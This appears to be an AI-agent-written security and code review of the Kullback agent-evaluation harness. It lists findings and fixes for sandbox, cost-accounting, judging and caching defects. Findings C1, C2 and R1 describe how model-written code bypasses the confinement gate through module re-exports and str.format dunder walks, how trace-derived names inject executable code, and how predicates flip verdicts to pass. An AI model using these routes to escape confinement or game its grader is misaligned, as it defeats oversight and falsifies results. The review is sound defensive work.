<!-- Written 2026-09-03 by a review fleet: 40 agents over the union of every open branch, each finding then put to a skeptic who tried to refute it and, where the claim allowed, proved or killed it by changing the code and running the suite. Working payloads for the confinement bypasses are described rather than reproduced, since this repository is public and the gate is fixed in a later change than the one that adds this file. -->

# Kullback codebase review

Scope: 27,109 lines of Python under `kullback/` across 82 files, plus `scripts/`, on a scratch worktree holding the union of every open branch. Suite is 1,878 tests and passes. Reviewed on five axes by slice, through four simplification lenses, and with security and architecture sweeps. Every finding below was then put to a skeptic who tried to refute it and, where the claim allowed, changed the code and ran the suite.

---

## 1. Verdict

This is a serious codebase with an unusually explicit spine. The decision log is real: 130-odd numbered decisions that the code mostly follows, and when the code diverges the divergence is usually recorded somewhere (`docs/todo.md`, a phase doc) rather than hidden. Layering is machine-checked (`lint-imports`, 3 contracts, 0 broken), gates are pure functions in one registry, records are one Pydantic module, and the rule "a judge can never award a pass" is stated in CONTRIBUTING and mostly honoured in code. The test suite is behaviour-named, near-mock-free and fast, and it caught a lot of what would otherwise be in this report. Verification of these findings repeatedly went: apply the suggested fix, run 1,878 tests, green. That is a codebase where a fix is cheap, which is the property that matters most.

What it is like to work in: legible at the module level, heavy at the file level. Six modules are two to three times their own design band (`compile_env.py` 1,371, `build.py` 1,166, `report.py` 1,124, `provider.py` 1,092, `memory.py` 1,063, `verifier_suite.py` 1,048), and design section 10, the document CONTRIBUTING makes authoritative for sizes, still describes a `src/` tree that no longer exists and a `builder/verifier.py` that was superseded by D123. `docs/architecture.md`, named in the review brief as the map, does not exist in this worktree. So the fastest way to learn the system today is the decision log plus grep, not the design doc.

What is genuinely good, beyond the spine: the gate ideas are the right ideas. Held-out call splitting, replay fidelity, the D79 mutation gate on Verifiers, the non-trivial gate, the confinement gate, the runner/gates version split that keeps stored Verdicts honest. The Examiner/Builder boundary is enforced by hooks and by import contracts, not by convention. Several stages are genuinely parallel. Cost is metered per stage and per model call. Somebody thought hard about what makes an environment rebuild trustworthy, and that thinking is in the code, not only in the docs.

What would bite first, in order. The static confinement gate that stands in for a sandbox does not hold. Two independent bypasses run arbitrary code in the Runner's own process: an allowlisted module's plain attribute re-exporting the operating-system module, and `str.format` on a dunder walk written inside a string literal where the checker sees no attribute node, both passing `gate_confined` with zero failures, both demonstrated end to end. Separately, the generated module interpolates mined table and column names verbatim, so a customer trace whose JSON key contains Python source becomes module-level code that `load_toolkit` execs, and the gate structurally cannot see it because it only walks methods of `DomainTools`. That is three ways past the one thing standing between model-written or trace-derived text and the process.

After that, the numbers. Cost accounting prices calls by the model id the provider echoes back rather than the id the ceiling was validated against, so a ceilinged build spent 15.00 USD of real calls while `budget.json` said 0.00 and no `BudgetExceeded` fired. The report's headline Frontier-versus-Candidate split reads a `frontier_models` config key nothing in the harness writes, so every graded Verdict is published as a Candidate Run. Both agentic judges are constructed in the only production path with no tools, and a judge with no tools can only abstain, after paying for the model call. None of these is subtle once seen, and all three are small fixes.

Then the caching. `starting_state` depends on `compile_env` mutating the `schema` artifact in place, so from round two of an ordinary `kullback build` the synthetic row ids vanish, `env_id` changes for an identical world, and D49 assisted marking silently switches off. The ingest stage's cache key hashes file paths and never file bytes, so `build --iterate` over an edited corpus at the same path reuses the old Traces and reports a complete build.

The generality risk is real but narrower than feared. The harness is not pervasively tau2-shaped; it is tau2-shaped at about a dozen named points, most of which the docs already flag. The ones that actually cost grades are the `_id` suffix convention in `verifier_suite._entity` (retired in the miner by D102, still live in the Verifier suite), English keyword matching in `classify_exception`, and the US-shaped value regexes shipped as the "generic in every domain" vocabulary core.

Nothing here suggests the design is wrong. It suggests the confinement gate has not kept up with what it is protecting, and that several load-bearing numbers are computed from inputs nothing writes.

---

## 2. Critical and required findings

Ranked by what they cost. Findings of the same shape in several places are one entry.

### C1. The confinement gate does not confine (three bypasses)

`kullback/gates/confinement.py:31` (`ALLOWED_IMPORTS`), `:102` (`_body_confinement`), with `kullback/builder/compile_env.py:573` re-running the same check.

Evidence, all reproduced end to end on this worktree's interpreter (CPython 3.12.11):

- Module re-exports. `uuid.os`, `uuid.sys`, `random._os`, `typing.sys`, `statistics.sys`, `collections._sys` and `json.codecs` all resolve, and uuid, random, typing, statistics and collections are on `ALLOWED_IMPORTS`. A body that imports one allowed module and then reaches the operating-system module re-exported on it ran a shell command and read its output back. A second body through the same re-export spawned a subprocess and wrote into the reviewing interpreter's own process environment. `run_gates` returned all seven gates passed. `_body_confinement` tests only the import root, `node.attr.startswith('__')`, and `ast.Name in DENIED_BUILTINS`, so `uuid`, `os` and `popen` are each invisible to it.
- `DENIED_ATTRS` is not applied here. `runner/confinement.py:27` defines `frozenset({'format','format_map'})` and `confine` applies it; `gates/confinement.py` imports only `DENIED_NAMES` and `confine` from that module. A method whose whole body is a single `str.format` call, with the attribute walk written inside the format string where no `ast.Attribute` node exists, passed `gate_confined`, loaded, and returned the builtins module. Combined with the first bypass, the same shape read an API key out of the process environment and returned it, with zero gate failures.
- The predicate gate is stricter than the body gate for no stated reason: `runner/confinement.confine` refuses any single-underscore attribute plus `DENIED_ATTRS`, and none of that is applied to tool bodies.

Fix, in `_body_confinement`: refuse any attribute whose name starts with `_`, apply `DENIED_ATTRS`, and add a module-attribute rule, for each name bound by an allowed import refuse `alias.attr` when `type(getattr(module, attr, None)) is types.ModuleType`. That is cheap because the allowlist is stdlib and already imported in the generated module, and it closes the family rather than blacklisting `os` by name. Refuse a dunder written inside a string constant too. Add one test per leaking module asserting `gate_confined(...).passed is False`.

### C2. Trace-derived identifiers become module-level code

`kullback/builder/compile_env.py:494` and `:496` (`render_data_model`), with `kullback/gates/confinement.py:235` (`source_confinement`).

`render_data_model` emits `f"    {name}: Optional[Any] = Field(default=None)"` with no validation, and pastes the table name verbatim as the DB class field. `mine.mine_schema` builds `Column(name=str(name))` straight from tool-result JSON keys and db.json rows (`mine.py:1215, 1226, 1237`), and `grep -rn 'isidentifier|iskeyword' kullback/` returns nothing, so no stage in between validates. `source_confinement` only walks `FunctionDef` members of `DomainTools`, so a class body or a module-level statement is outside what it looks at, though its docstring claims the module's bytes are code-owned.

Reproduced: a column name carrying a newline and Python source renders as a live class-body statement, `gate_confined` returns `passed=True` with zero failures, and `load_toolkit` executed the injected statement and returned a working toolkit. A second variant produced a module-level import and call, which also ran. The payloads are described rather than written out here; the shape is enough to write the fix and the tests. The benign twin is a denial of service: column names `class`, `from`, `order id`, `Content-Type`, `2nd_item` and a table named `order items` all fail `gate_parses` unrepairably, because the failure is in the code-owned skeleton (`compile_env.py:1149`). `build.py:537/556, 652/712, 759/766` all feed `module_source` to `load_toolkit`, so the path is live.

Fix, two independent changes. At render time, put every table, column, tool and argument name through an `_as_identifier` that requires `name.isidentifier() and not keyword.iskeyword(name)`, aliasing through `Field(alias=...)` otherwise and recording the aliasing as an assumption so a Verdict still compares by the customer's name. Independently, widen `source_confinement` to walk module-level and class-body statements of the module about to be exec'd, with the code-owned skeleton on an allowlist keyed by content hash rather than by class name.

### C3. Spend is priced by the id the provider echoes, not the id the ceiling validated

`kullback/runner/budget.py:496` (`BudgetedModel.query`), with `kullback/ai/pricing.py:200` (`price_from_catalog`).

`Cost.model = reply.model or self.model_id`, and `provider.py:795/884` sets `model=data.get("model") or self.wire_id`. Reproduced with the shipped `BudgetedModel` over a stub whose reply echoes a dated id, 1.00 USD ceiling, five calls of 100k input / 20k output / 200k cache_write: `echo='o4-mini-2025-04-16'`, `model_id='openai/o4-mini'` gives `calls_made=5, usd=0.0000, unpriced_calls=5` and no `BudgetExceeded`. The identical run with the echo left as None charges 0.9900. `price_for('openai/o4-mini')` resolves; `price_for('o4-mini-2025-04-16')` resolves nowhere in the real 207-provider snapshot. OpenAI's chat-completions API does echo the dated snapshot id for an alias request. `build.py:969-1088` wraps every stage and the Candidate with the ceiling, so this is the normal path, and `unpriced_calls` is surfaced only by `tui/__init__.py:186`, never by `report.py`.

The second half compounds it. `price_from_catalog`'s bare-id fallback scans all 207 providers and takes the first hit in JSON key order: `price_for('gpt-4.1-mini')` returns cortecs at 0.434/1.704 against openai's 0.4/1.6, and `price_for('claude-sonnet-4-5-20250929')` returns a provider whose `cache_write` is absent, so cache writes bill at zero.

Fix: pass `self.model_id` to `call_cost` and `price_source`, keeping the provider's echo in a separate `model_reported` field on `Cost`. In `price_from_catalog`, drop the first-hit scan; return a price only when every provider listing the bare id agrees, otherwise return None so the call lands in `unpriced_calls` rather than being mispriced. Surface `unpriced_calls` in `report.py`.

### C4. `starting_state` depends on a side effect, so a cached run loses the synthetic rows

`kullback/builder/build.py:216` (`_state_stage`).

`starting_state` reads the synthetic row ids off the `schema` artifact that `compile_env` mutated in place (`compile_env.py:234` and `:313`). `mine`'s cache entry holds the pre-mutation schema, so on a cache hit nothing re-applies the mutation. Reproduced: two builds of `tests/fixtures/tau2_retail_small.json` in one workdir with `grow={"orders": 12}`, the second with `iterate=True`. `env_id` went `fb3b2571...` to `bd96a2cb...`, `schema.json` `synthetic_rows` went 8 to 0, and nine stages re-ran (build_environment, cluster, compile_tools, ingest, judge_lessons, mine, replay_reference, rerolls, vocabulary). Wider than the original claim: two `execute(plan)` calls on one `BuildPlan`, which is the shape `rounds.py` drives since `execute` rebuilds its store from disk each round, give the same divergence, so this hits the default `kullback build` from round 2 on, not only `--iterate`. `docs/todo.md` records a neighbouring issue ("Stage side-effect files on a cache hit") that covers `synthetic.json` but not the lost env identity or the lost D49 assisted marking.

Fix: stop reading the mutated input. `_state_stage` already returns `synthetic_rows` as a declared artifact, so pass `inputs["synthetic_rows"]` to `route.Router` at `build.py:560`, `:716` and `:770`, thread it into `_candidate_runs` and `probe_runner` beside `schema`, and set it explicitly on the schema copy `_environment_stage` hands to `build_environment`. Test: build the fixture with `grow` twice in one workdir, assert the two `env_id`s and the two `schema.synthetic_rows` are equal.

### R1. A model's opinion can turn into a pass

`kullback/runner/atom_context.py:234` (`AtomContext.env`).

The atom environment hands every predicate the Verdict's own live state. Reproduced: a Run with one required write and one extra `refund` write scores `class=fail, failing_atom=extra_write:refund`. Adding a hard atom whose predicate is `wrote('refund') or True` gives `class=pass`, in either atom order, because hard atoms run last with `context.marking True` (`verdict.py:145`) and `extra_writes()` is computed after them (`verdict.py:230-236`). Two hard atoms, the first assigning into `end_state`, flipped the second from pass to fail.

`builder/policy._static_check` is an allowlist and refuses the naive form, but two paths still reach it. `examiner/tools._atom_of` feeds an arbitrary `add` payload straight to `make_atom`, and a predicate of the form `try: wrote('refund') except Exception: pass; return True` was accepted by `hard_holds` (whose namespace has no `wrote`, so the call is swallowed) and flipped a Verdict from fail to pass. And `pre_state` is the real `start_state` dict while `_static_check` permits subscript assignment, so a rule that normalizes a row in place passes the build gate and changes what a later atom sees. This is the code path CONTRIBUTING forbids by name.

Fix: deep-copy `start_state` and `end_state` into `env()`, return copies from `write_calls()`, `extra_writes()` and `calls`, and snapshot `covered` before any atom that is not a write atom runs, so `extra_writes()` reflects only what the write atoms produced.

### R2. Both agentic judges are toolless, and the third sample is a re-roll of the second

`kullback/runner/judge.py:62` (`AgenticJudge.__init__`) and `:295` (`two_judges`), wired at `kullback/cli.py:76-88`.

`AgenticJudge(model, name='a')` with no tools returns `verdict=abstain, refused=True, tools_run=[], reason='refused: no tool check before the verdict (D92)'`, after the provider call has been made and paid for. `cli.py:86` is the only non-test construction and passes no tools; nothing assigns `.tools` later. Every test constructs with `TOOLS`, so nothing covers the CLI's shape. D92 (decision-log.md:430) requires read tools over the Task's Starting state and the Run's End state and at least one check before answering.

`cli._judges` returns `(first, third_judge(first))` and `two_judges` line 295 takes `extra = third_judge(judge_a)`, the same call. Reproduced: `(b.name, b.persona, b.tools, b.max_steps) == (extra.name, extra.persona, extra.tools, extra.max_steps)`, both named `mid:a#3`. On a real split the result is `reason='the two judges split, mid:a#3 agreed with mid:a#3 on unacceptable'`, an empty `disagreement_queue.jsonl`, `disagreement: false` on the pairs row, and a published `disagreement_rate` of 0.0. At temperature 0 against a live provider the third sample is a biased re-roll of judge B's exact request, not an independent opinion.

Fix: raise in `__init__` when `tools` is empty (or return the refusal before the first `query`), and give `judge.py` the read-only Starting-state and End-state tools D92 names, passed from `cli._judges`. Give the third sample a persona and name distinct from both judges, refuse a third sample whose construction matches judge B, and record `split: true` on the pairs row even when the third sample settles it.

### R3. The report's Frontier and Candidate split has no input

`kullback/report.py:241` (`task_numbers`).

`grep -rn frontier_models` over the tree returns the field (`report.py:86`), the read (`:241`), the load (`:1110`) and one test. The only writer of `report_config.json` is `build.py:1100`, writing `{"kind": "batch"}`. Replays and re-rolls share the Run folder with Candidate Runs: `build.py:561` writes replays to `runs/<task>/`, `_candidate_runs` writes re-rolls with the `reroll-` prefix to the same place, and `cli._score` globs `runs/<task>/*.jsonl`. Ran `task_numbers` on a passing `reroll-t1-0`, a failing `t1-0` and a passing `replay-tr1`: `frontier_runs 0, frontier_pass_rate None, candidate_runs 3, candidate_pass_rate 0.67, margin None`, while the Candidate scored 0 of 1. `report.py:641-642` renders those verbatim as the D85 pass-rate lines.

Fix: classify off what the records already carry. Replays are `model == replay.RECORDED`, re-rolls carry the `reroll-` run-id prefix, `run_batch` Runs carry the Candidate's `--model`. Until the split has an input, refuse to publish a Candidate pass rate rather than publishing one computed over every Run in the folder.

### R4. Tool gates that pass on nothing, and a sandbox world that is not fresh

`kullback/builder/sandbox.py:343` (`run_gates`) and `:102` (`_RUNNER.main`).

A tool with no recorded calls passes gates 2 through 6 vacuously. Ran `compile_tool` with `calls=[]` and a body returning `{'refund_id': 'anything I like'}`: `assisted False`, and all seven gates pass, with `executes_on_s0 {'calls':0}`, `deterministic {'calls':0}`, `non_trivial {'insufficient_evidence':True}`, `replay_fidelity {'success_calls':0,'success_fidelity':1.0}`. Reachable: `build.py:248-256` counts a call as evidence only when its trace is in `seeds` and it is not an after-write call, and `_seed_traces` is each Task's Runs minus its anchor, so a tool called only inside single-run Tasks' anchors, or only after a write on the same row, arrives with an empty call list. `gates/stages.py:34` only fails a tool whose body string is blank, so nothing downstream notices, and the tool ships reported as gated and not assisted.

Separately, the sandbox's fresh world per call is fresh only at the top level. `db_class.model_validate(job["dbs"][call["db"]])` re-validates the same dict per call and `render_data_model` emits every column as `Optional[Any]`, which pydantic stores by reference. A body appending to `order.items` gave `[{'seed'},{'a'}]` then `[{'seed'},{'a'},{'b'}]`, so call two answered on call one's output. The existing guard test writes only a scalar, which is why nothing catches it. Applying `copy.deepcopy` in the child fixed it, 101/101 in `tests/builder/test_compile_env.py`.

Fix: in `run_gates`, when `shown` is empty return a failing or explicitly `insufficient_evidence` ruling and have `compile_tool` mark the tool assisted with the reason "no recorded call to gate it against". In `_RUNNER`, `db_class.model_validate(copy.deepcopy(...))`, with a regression test whose body appends to a nested list.

### R5. A Trace whose customer speaks first can never confirm its Reference

`kullback/runner/replay.py:72` (`TraceModel.query` / `_Script.take`).

`take('assistant')` returns None as soon as the next spoken turn is a user turn, `query` counts that as a gap, and `_score` turns any gap into a reason while `confirmed` is `not reasons`. Ran three variants of the replay fixture: baseline `confirmed=True gaps=0`; the greeting removed so the customer speaks first, `confirmed=False gaps=1 reasons=['1 turn(s) out of order']` with `writes_matched 1/1` and `reads_same 1/1`; a second consecutive user turn, the same. `ingest._tau2_trace` reads `role` verbatim, so any corpus whose first message is a user message produces this shape, `reference_replay_gate` rejects the Task, and the Examiner reports it as not verdicted. `loop.open_with_user` exists and `replay_trace` never calls it.

Fix: when the Trace's first spoken turn is a user turn, drive `TraceUser` once before the first model call, and in `_Script.take` let a turn of the other role be handed to that speaker rather than counted as a gap. Reserve `gaps` for a turn no speaker consumed by the end of the replay. Add both fixtures.

### R6. Ingest's cache key hashes paths, not bytes

`kullback/builder/build.py:149` (`_ingest_stage`).

Reproduced: wrote a 1-simulation corpus to a tmp path, built, rebuilt with `iterate=True` and the same file, then rewrote the same path with all 3 simulations and rebuilt with `iterate=True` again. `pipeline/state.json` says ingest "cached", `traces/` still holds 1 file and one Task, and the build returns status "complete". The stage declares no inputs and no `input_paths`, and `code_version` hashes only `str(p)`. `--file` and `--iterate` are both flags on `kullback build`, so this is an operator flow. Not in `docs/todo.md`.

Fix: `content_hash([{"path": str(p), "sha256": sha256(p.read_bytes())} for p in files])`, with a stable placeholder for a path that is not a file so the stage fails loudly.

### R7. Narrowed Builder verbs lose the work of the Tasks they did not name

`kullback/builder/build.py:680` (`_rerolls_stage`), `kullback/builder/build.py:998` and `kullback/builder/tools.py:193` (`grow`).

`reroll(task)` releases a `rerolls` artifact holding only that Task. Full `execute(plan)` gives rerolls for both Tasks; `execute(plan, "rerolls", reroll_tasks=[one])` leaves `plan.store['rerolls']` holding that Task alone, while the sibling `execute(plan, "replay_reference", replay_tasks=[one])` keeps all three Tasks' replays because `build.py:546` reads `replays.json` back. `rounds.py:370` refreshes the Examiner plan from that store and `examiner/plan.py:90` replaces `self.inputs` outright, so the dropped Tasks fall out of `merged_rerolls` and `task_runs_of` and the gates weaken silently.

`grow` is worse in a different way: the narrowing is never written back to the plan. Base build's first table holds 6 rows, `execute(plan, "starting_state", grow={table: 11})` gives 11 and leaves `plan.grow` at None, and the next `execute(plan)` gives 6 again. A second grow of another table drops the first by the same route. And because the grow tool targets only `starting_state`, `build_environment` is not rebuilt, so the grown world never reaches the Environment the Examiner grades even before the revert. The merge expression in `tools.py:193` shows accumulation was intended; only the write-back is missing. No decision makes growth transient; D107 is silent.

Fix: write `rerolls.json` in the unnarrowed stage, declare it in `input_paths` for the narrowed variant, and seed `out` with the rows of the Tasks not in `only`. For grow, persist the merged map on the plan before building the stage list, and include `build_environment` in the grow narrowing.

### R8. `wrote(self, tool, **fields)` collides with customer argument names

`kullback/runner/atom_context.py:116`.

`verifier_suite._predicate` emits `wrote('update_order', **{'tool': 'x'})` for a write whose argument is named `tool`. Scoring such a Run gives `class=not_verdicted, notes=['atom_error:w0.tool:TypeError', 'not_verdicted:w0.tool: a required atom could not be evaluated']`, permanently. Same for `self`. A control field `order_id` scores pass. Nothing upstream sees it, because the D79 suite scores the structured target and not the emitted source. Fix: `def wrote(self, tool: str, /, **fields)`. Applied, both collisions score pass, 93 tests across `test_atom_context.py`, `test_verdict.py` and `test_verifier_suite.py` pass. Check the other `env()` helpers that take a name plus caller-supplied data the same way.

### R9. The Verifier suite finds the write entity by the convention D102 retired

`kullback/gates/verifier_suite.py:164` (`_entity`).

`_entity({'reservation_id': 'R1'})` gives `('reservation_id','R1','r1')`; `{'flight_number': 'HAT001'}` and `{'orderNo': 'A-77'}` both give `('', None, '')`. D102 (decision-log.md:559) records that this suffix rule was retail's convention and that airline's `flight_number` defeats it, which is why the miner stopped using it. Two consequences reproduced. `write_effects` keys two `book_flight` calls as `book_flight|` and `book_flight||2` in call order, so booking HAT001 then HAT002 and booking HAT002 then HAT001 pair up differently across two good Runs, `agreed` goes false, and `w0.flight_number` drops from required to allowed. And `wrong_run` skips any write whose payload has no `id_field`, so D79 check 4's wrong-entity probe cannot be built and falls back to blanking the transcript; with an agent-chosen id, a Run that acts on the wrong entity scores pass where the same Run with an `_id`-named field scores fail.

Fix: thread the corpus's id columns in. `mine.id_columns` is a pure function of traces and traces is already in the Examiner's `DERIVE_INPUTS`, so compute it inside the Examiner's boundary and pass it through `derive_verifier` into `write_effects` as `id_names`, keeping the `_id` suffix as the fallback it is in `mine._is_id`. `CanonRules.id_patterns` (`runner/canon.py:582`) is keyed `"{table}.{column}"` and is already in the Examiner's store as a second route. Report a gate failure when a write call yields no entity at all.

### R10. Two error classifiers disagree, and the replay gate fails bodies that reproduce the recording

`kullback/gates/tool_runs.py:181` (`classify_exception`).

`body_replay_fidelity_gate` compares `classify_exception`'s answer against `call.error.class_`, which `ingest.classify_error` assigned to the same message, at threshold 1.0. They disagree on real payloads: "This exchange is not allowed for a delivered order." gives business_error against permission_denied; "Order must be in pending status" gives unknown against invalid_arguments; "Rate limit exceeded, try again later" gives transient against unknown; "Item unknown" gives unknown against not_found_entity; "User is not authorized to perform this action" gives permission_denied against business_error. `route._class_of` is a third answer again. End to end: a ToolCall whose error came from `ingest.classify_error` paired with the sandbox's own result shape makes the gate return `passed=False` with "expected error business_error, got permission_denied", so a body raising exactly the recorded message is re-rolled. Three of the four branches are English keyword matches, contradicting the docstring's claim of shape over text; non-English messages fall through to business_error.

Fix: lift ingest's `_rule_class` and its structured-code path into one pure function beside the D67 records (it imports nothing from ingest, and gates may not import builder), have `classify_exception` call it after an exception-type map, point `route._class_of` at the same type map, and delete the substring chain.

### R11. The Verdict re-derives "hands off to a person" from a name substring

`kullback/runner/verdict.py:98` (`_is_transfer`).

`_is_transfer` fires on `transfer_money`, `transfer_funds`, `transfer_reservation` and `escalate_case`; `mine.GENERIC_NAME` fires on none of them, because it anchors on `transfer_to_human`. Traced through `_classify` (`verdict.py:179-183`): with `transfer_money` in `write_tools`, `acting` is empty and `any(_is_transfer(name))` is true, so a failed Run whose only writes were money transfers is reported as `transferred_without_acting` rather than `fail`, which is a D46 class the report counts. The miner's answer is correctable by declared annotations, the LLM and D68 observed effects; the Verdict's is not. The data is already at the call site: `cli.py:184-185` builds `write_tools` and `flagged_tools` off the same sigs.

Fix: add `generic_tools = {sig.name for sig in sigs if sig.kind == "generic"}`, thread it into `verdict()` the way `flagged_tools` is threaded, have `_classify` use it, and delete `TRANSFER_HINTS`.

### R12. The simulated user's own tool calls are read as the agent's

`kullback/runner/records.py:176` (`Trace.tool_calls`), with `kullback/builder/vocabulary.py:127-148, 213`, `kullback/builder/compile_env.py:284`, `kullback/builder/intent.py:124`, `kullback/builder/cluster.py:142`, `kullback/builder/build.py:159, 192, 250, 336`, `kullback/examiner/stage.py:137`.

`mine.is_assistant_call` is applied at nine sites and missing at the twelve above. `vocabulary.py` has no reference to `requestor` at all. Two consequences reproduced. `referenced_ids` over a trace holding an assistant `get_line(line_id=L100)` and a user-side `run_speed_test(line_id=L999)` returns both, so `environment_gate` demands a row for L999 or `add_synthetic_rows` invents one. And `vocabulary._openers` over a corpus whose first call in every trace is the user's own `check_network_status` returns that tool as the one that names the user, which flips the derived field from `identity` to `reference`; filtering the user calls returns the real opener and the correct kind. `docs/todo.md:101` records the requestor fix as done for mine, cluster and compile_env, so it is half done inside compile_env itself and not done at all in vocabulary, which post-dates it.

Fix: put the split on the record. Add `Trace.agent_calls` and `Trace.user_calls`, leave `tool_calls` as the raw union that only ingest and `skipped_user_calls` read, move every consumer to `agent_calls`, and add a source scan asserting nothing outside ingest reads `.tool_calls` directly.

### R13. Three mining rules that produce a wrong artifact

`kullback/builder/vocabulary.py:162` (`_scan_pattern`), `kullback/builder/mine.py:977` (`id_columns`), `kullback/builder/intent.py:80` (`_earlier_view`).

- `_scan_pattern` rewrites every literal `.` in the id pattern, including the escaped `\.` that `mine.id_pattern` emits. `id_pattern(['ACC.1001'...])` gives `^AC{2}\.10{2}\d$`, `_scan_pattern` gives `\bAC{2}\[A-Za-z0-9]10{2}\d\b`, and searching "my account is ACC.1001" is False. Same on email-shaped ids. Both branches of `_value_pattern` route through it, so there is no fallback, and `vocabulary_gate` passes an empty failure list. Fix: `re.sub(r"(?<!\\)\.", "[A-Za-z0-9]", pattern.strip("^$"))`. Applied, repro matches, full suite 1878 passed.
- `id_columns` disqualifies a column permanently on one multi-row result where a single row carries it, contradicting its own docstring. `[{'flight_number':'HAT001'},{'flight_number':'HAT002'}]` gives `{'flight_number'}`; adding `[{'flight_number':'HAT003'},{'note':'no direct flight'}]` gives `set()`. Fix: judge on the rows that carry the column, `continue` when fewer than two do. Applied, full suite 1878 passed.
- `_earlier_view` only recognises ids named `<entity>_id`, while `mine._is_id` already accepts a bare `id` and cites D52 for it. On a ticketing corpus keyed by `id`, `_written_value` returns `{'id': 'T-1'}` so the write's real effect is not the span; renaming the key to `ticket_id` returns `{'status':'escalated','queue':'tier2'}` as designed. Fix: `ids = [k for k in sorted(shared) if k == "id" or k.endswith("_id")]`, and thread `mine.id_columns(traces)` down through `write_intent` and `span_candidates` for corpus-learned ids.

### R14. Ingest loses a whole file on one malformed message

`kullback/builder/ingest.py:290` (`derive_traces`).

The per-simulation reject path catches only `ValidationError`. Three exports, each holding one valid simulation plus one bad one (`"messages": ["hello"]`, `"messages": {"0": {...}}`, `"tool_calls": {"id": "c1"}`) are all named tau2_native by `format_detect` and all three raise `AttributeError: 'str' object has no attribute 'get'` out of `ingest_file`, with no rejects directory and no trace derived, so the good simulation is lost too. The function's docstring promises the opposite and the gate already carries a `rejected` metric.

Fix: widen the except to `(ValidationError, AttributeError, TypeError, KeyError)` and give `_validation_reason` a branch for a non-ValidationError.

### R15. The policy sandbox and the recorded policy gate run different code

`kullback/builder/policy.py:275` (`run_constraint_tests`), with `kullback/gates/artifacts.py:237` (`_run_predicate`).

`policy.py` prepends `HELPERS_SRC` and `_static_check` admits `_HELPER_NAMES`, and `_CONTRACT` tells the model the transcript helpers are in scope. `gates/artifacts._run_predicate` execs the bare source. A Constraint whose predicate returns `user_confirmed(transcript)` gives `run_constraint_tests passed=True, ok=2` and `policy_gate passed=False` with "c_1: pos case raised NameError: name 'user_confirmed' is not defined" on both cases. Both recording sites are live (`build.py:364`, `examiner/stage.py:119`). Verdict time is unaffected, because `verifier_suite._predicate` wraps a Hard atom with the helpers.

Fix: in `_run_predicate`, exec `HELPERS_SRC + "\n" + source`. `HELPERS_SRC` lives in `gates/verifier_suite.py`, so gates does not have to import builder. Applied: the same Constraint passes both, and tests/gates plus tests/builder (891 passed) and tests/examiner plus test_e2e (153 passed) stay green.

### R16. The scorecard's tool-fidelity number reads a file nothing writes

`kullback/gates/scorecard.py:58` (`scorecard`).

`grep -rn held_out_calls` returns the reader and one test fixture. The build writes tasks.json, runs.json, task_status.json, user_facts.json, policy.json and tasks_frozen.json, and no `held_out_calls.json`. Running `scorecard()` over a real build dir gives `tool_fidelity.success.raw` and `.explained` both null, `gate.metrics.success_fidelity` and `error_fidelity` null, and `gate.pass` true; `report.py:924` flattens the null into a row with no value. The bar itself is still enforced during the build by `gate_replay_fidelity` in `builder/sandbox.py:366`, so what is lost is the D62 deliverable's report of it, and a reader cannot tell 100% from never measured.

Fix: have the compile_tools stage write its held-out call rows in the shape `replay_fidelity_gate` reads, or have `scorecard()` read the per-tool metrics from the stage's gate records. Until then, make a total of 0 on either bucket a scorecard failure, the way `tasks_covered == 0` already is at line 73.

### R17. Synthetic identity values inside lists are copied verbatim

`kullback/builder/synth.py:742` (`_redraw_identity`).

`mine_rules` on `tests/fixtures/tau2_retail/db.json` gives `orders.identity == ['fulfillments.[].tracking_id.[]', 'order_id']`. `grow(db, schema, {'orders': 1050}, seed=1)` added 50 rows, 34 of which carry a `tracking_id` byte-identical to an observed order's, and `grown.checks['ok']` is True, because both `_redraw_identity`'s `pending` filter and `_fingerprint` require `_record_path`, which is False for any path holding `.[].`. Keyed collections are not affected (growing users to 550 reused 0 payment-method keys). Not in `docs/synthetic-rows.md`'s known limits.

Fix: after `_rebuild_list` and `_rebuild_collection` have built the elements, walk `rule.identity` paths that are not `_record_path` and apply `_draw`/`_by_position` per element, tracking taken values per table. Extend `_fingerprint` or `verify` so a copied value fails the check.

### R18. The Examiner keeps a Verifier its own gate rejected

`kullback/examiner/tools.py:430` (`_record_versions`) and `:597` (`_refuse`).

`_record_versions` skips a second derive of content identical to `hist.versions[-1]`, including when that last row is a rejected derivation. Reproduced: derive, accepted tightening repair, derive (rejected by loosening, restored), derive again. After the second derive the on-disk Verifier equals the rejected derivation, `plan.current` is the rejected one, and the call reports `is_error False` with no loosening ruling. `derive_all` has already rewritten `verifiers/<task>.json` (`stage.py:183`) and `tools.py:380` reloaded it. It is not silent: `trusted_gate` then moves the Task to untrusted with "version ff0c907b... is not an accepted version", so the round-end ruling fails and names it. What remains is that the file on disk holds the version the gates rejected.

`_refuse` writes a `task_status` row without `reference_confirmed`. Reproduced: `refuse(t2)` before any derive leaves `{'t2': {'refused': {...}}}` on disk, and the next targeted `derive(target='t1')` returns `is_error True` with `KeyError: 'reference_confirmed'`, raised first at `stage.py:274` and again at `gates/stages.py:78`. `rounds.py:377-390` turns that into `ExaminerError` and the run stalls. In the other direction a full derive erases the `refused` key while `examiner/refusals.json` still holds the Task, so the two disagree.

Fix: compare against the last accepted row, not the last row, and on a repeat of a rejected digest re-run the restore path without appending a duplicate history row. Have `_refuse` seed the missing keys, have `verifier_for`/`no_reference_status` carry an existing `refused` key forward, and make `task_verifiers_gate` use `row.get("reference_confirmed")`.

### R19. Two ways `run_rounds` never returns a result

`kullback/rounds.py:466` (`Loop.result`) and `:455` (`Loop.close_round`).

A round-1 Builder that never calls `build` crashes: `run_rounds` over the fixture with a model that answers "I decline to build." raises `AttributeError: 'NoneType' object has no attribute 'artifacts'` at `rounds.py:466`, reached from line 530, because `builder_beat` takes the BuildError path when `plan.last is None` and then `result()` dereferences it anyway. `rounds.json` is written first, so only the caller loses its result.

And a finding whose suggested action keeps erroring clears the exit forever with no round bound. Seeded `findings.json` with one open finding whose suggested action is `replay` on a nonexistent Task, then ran the code-driven `run_rounds`: rounds 1 through 4 all ended with exit None, each recorded as "1 finding(s) owe the Builder a beat; the round continues", four rounds in about 12 seconds and no reason to stop. `allowance_for` returns None when round 1 spent nothing, so `exhausted` never trips either.

Fix: guard the head of `result()` for `plan.last is None`. Add a `max_rounds` argument to `run_rounds` and a CLI flag that exits `stalled` with the pending findings recorded, and stop clearing the exit for a finding that has already been delivered and failed N times.

### R20. Two defects in the agent core's context management

`kullback/agent/context.py:324` (`_units`) and `:185` (`ContextConfig.window`).

